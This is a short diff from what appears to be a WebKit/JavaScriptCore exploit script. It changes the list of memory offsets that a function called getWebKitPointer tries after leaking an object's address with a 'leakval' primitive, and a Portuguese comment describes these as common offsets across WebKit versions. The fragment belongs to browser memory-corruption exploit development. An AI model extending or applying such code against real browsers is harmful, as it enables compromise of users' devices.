@@ -310,7 +310,8 @@ function getWebKitPointer(p) {
     const cell = p.leakval(el);
     
     // Offsets comuns para o objeto C++ em diferentes versões do WebKit (JSC)
-    const offsetsParaTestar = [0x10]; 
+    const offsetsParaTestar = [0x20, 0x28, 0x30, 0x38];
+ 
     
     for (const offset of offsetsParaTestar) {
         log(`[*] Testando offset 0x${offset.toString(16)}...`, 'log-dim');
